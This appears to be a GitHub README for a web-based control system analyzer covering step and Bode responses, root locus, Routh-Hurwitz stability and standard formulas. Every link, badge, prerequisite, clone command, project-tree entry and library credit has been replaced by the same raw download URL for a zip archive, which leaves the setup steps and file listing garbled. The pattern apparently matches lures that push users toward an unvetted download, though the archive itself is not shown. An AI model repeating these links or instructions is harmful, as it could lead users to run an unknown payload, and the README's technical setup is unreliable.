# 🎛️ Advanced Control System Analyzer

An interactive web-based tool for analyzing and visualizing control system responses. Built to help engineering students understand fundamental control system concepts through visual demonstrations.

[![Live Demo](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)
![HTML5](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)
![JavaScript](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)
![Plotly](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)
![Vitest](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)

## 📚 Overview

This tool provides interactive analysis of control systems including:
- **Time Domain Analysis** - Step, Ramp, Impulse, Parabolic, and Sinusoidal responses
- **Frequency Domain Analysis** - Bode plots, Nyquist plots, Polar plots
- **Root Locus Analysis** - Visualize pole movement as gain varies
- **Stability Analysis** - Routh-Hurwitz criterion and Hurwitz determinants

## ✨ Features

### Time Response Analysis
| Feature | Description |
|---------|-------------|
| First-Order Systems | G(s) = K / (τs + 1) |
| Second-Order Systems | G(s) = Kωn² / (s² + 2ζωns + ωn²) |
| Higher-Order Systems | Custom numerator/denominator polynomials |
| Input Types | Step, Ramp, Parabolic, Impulse, Sinusoidal |

### Calculated Parameters

**Time Domain:**
- Delay Time (Td) - Time to reach 50% of final value
- Rise Time (Tr) - Time from 10% to 90% of final value
- Peak Time (Tp) - Time to reach maximum overshoot
- Settling Time (Ts) - Time to stay within 2% of final value
- Maximum Overshoot (Mp) - Percentage overshoot
- Steady-State Error (Ess) - Difference between input and output

**Frequency Domain:**
- Gain Margin (GM) - Extra gain before instability
- Phase Margin (PM) - Extra phase lag before instability
- Gain Crossover Frequency (ωgc)
- Phase Crossover Frequency (ωpc)
- Bandwidth (ωb)
- Resonant Peak (Mr)
- Corner Frequencies

### Stability Analysis
- **Routh-Hurwitz Array** - Visual table with sign change detection
- **Hurwitz Matrix** - Principal minors calculation
- **Pole-Zero Map** - Visual representation of system poles and zeros
- **BIBO Stability** - Bounded-Input Bounded-Output analysis

## 🚀 Getting Started

### Prerequisites
- A modern web browser (Chrome, Firefox, Safari, Edge)
- https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip v18+ (for development)

### Quick Start

1. **Clone the repository:**
   ```bash
   git clone https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip
   cd Control_system_analyzer
   ```

2. **Install dependencies:**
   ```bash
   npm install
   ```

3. **Start development server:**
   ```bash
   npm run dev
   ```

4. **Open in browser:**
   ```
   http://localhost:5173
   ```

### Alternative: Open Directly
Simply open `https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip` in your browser — no server required!

## 🧪 Testing

Run the comprehensive test suite:

```bash
# Run all tests
npm test

# Run with coverage
npm run test:coverage

# Interactive test UI
npm run test:ui
```

**24 unit tests** covering:
- Complex number operations
- Polynomial utilities
- Root finding algorithms
- Helper functions

## 📖 Usage Guide

### Time Response Analysis

1. Select **System Order**: First-Order, Second-Order, or Higher-Order
2. Enter system parameters:
   - **First-Order**: Gain (K), Time Constant (τ)
   - **Second-Order**: Gain (K), Natural Frequency (ωn), Damping Ratio (ζ)
   - **Higher-Order**: K, Numerator coefficients, Denominator coefficients
3. Select **Input Type**: Step, Ramp, Parabolic, Impulse, or Sinusoidal
4. Click **"Analyze Time Response"**

### Frequency Response Analysis

1. Select **System Order** and enter parameters
2. Choose **Plot Type**:
   - **Bode Plot** - Magnitude and Phase vs Frequency
   - **Nyquist Plot** - Polar plot of G(jω)
   - **Polar Plot** - Similar to Nyquist
   - **Root Locus** - Pole movement vs Gain
3. Set frequency range (default: 0.1 to 100 rad/s)
4. Click **"Analyze Frequency / Root Locus"**

### Stability Criteria

1. Enter the **characteristic polynomial** coefficients
2. Click **"Generate Stability Tables"**
3. View:
   - Routh Array with sign change analysis
   - Hurwitz Matrix with principal minors

## 📁 Project Structure

```
control-system-analyzer/
├── https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip              # Main HTML structure
├── https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip               # Core control system calculations
├── https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip              # Dark theme with glassmorphism
├── https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip            # Dependencies & scripts
├── .gitignore              # Git ignore rules
│
├── js/                     # Modular JavaScript
│   ├── config/
│   │   └── https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip    # Centralized configuration
│   ├── utils/
│   │   ├── https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip # Complex number & polynomial utilities
│   │   ├── https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip  # Root finding algorithms
│   │   └── https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip Export functionality (PNG, SVG, JSON, CSV)
│   └── ui/
│       └── https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip # Enhanced UI components
│
├── css/
│   └── https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip    # Enhanced UI styles
│
└── tests/
    └── https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip Unit tests (24 tests)
```

## 🛠️ Technologies Used

- **HTML5** - Structure
- **CSS3** - Modern dark theme with glassmorphism effects
- **JavaScript (ES6+)** - Control system calculations & modules
- **[https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)** - Interactive chart plotting
- **[MathJax](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)** - Mathematical formula rendering
- **[https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)** - Complex number operations
- **[Vite](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)** - Build tool & dev server
- **[Vitest](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)** - Unit testing framework

## 🎓 Control System Concepts

### Second-Order System Response Categories

| Damping Ratio (ζ) | System Type | Behavior |
|-------------------|-------------|----------|
| ζ < 1 | Underdamped | Oscillates before settling |
| ζ = 1 | Critically Damped | Fastest settling, no overshoot |
| ζ > 1 | Overdamped | Slow response, no oscillation |

### Stability Margins

- **Gain Margin**: How much gain can be increased before instability
  - GM > 0 dB → Stable
  - GM = ∞ → Unconditionally stable for gain

- **Phase Margin**: How much phase lag can be added before instability
  - PM > 45° → Well-damped response
  - PM > 30° → Acceptable damping
  - PM < 30° → Poor damping, oscillatory

### Routh-Hurwitz Stability Criterion

A system is **stable** if and only if:
1. All coefficients of the characteristic polynomial are positive
2. All elements in the first column of the Routh array are positive
3. No sign changes occur in the first column

## 📐 Key Formulas

### Second-Order Step Response (Underdamped)
```
c(t) = K[1 - (e^(-ζωnt) / √(1-ζ²)) × sin(ωd×t + φ)]
where φ = atan(√(1-ζ²) / ζ) and ωd = ωn√(1-ζ²)
```

### Time Domain Specifications
```
Rise Time:     Tr ≈ (π - β) / ωd
Peak Time:     Tp = π / ωd
Settling Time: Ts ≈ 4 / (ζωn)     (2% criterion)
Overshoot:     Mp = e^(-πζ/√(1-ζ²)) × 100%
```

### Stability Margins
```
Gain Margin:  GM = -20 log₁₀|G(jωpc)|   where ∠G(jωpc) = -180°
Phase Margin: PM = 180° + ∠G(jωgc)       where |G(jωgc)| = 1 (0 dB)
```

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

## 📄 License

This project is open source and available under the [MIT License](LICENSE).

## 🙏 Acknowledgments

- Control system formulas based on standard textbooks:
  - Ogata, K. "Modern Control Engineering"
  - Nise, N. "Control Systems Engineering"
  - Dorf, R. & Bishop, R. "Modern Control Systems"
- Built with [https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip) for interactive charts
- Mathematical rendering by [MathJax](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)
- Complex operations by [https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)

## 📞 Support

If you encounter any issues or have questions:
1. Check the existing issues on GitHub
2. Create a new issue with detailed description
3. Include browser console errors if applicable

---

**Made with ❤️ for Control Systems Students**
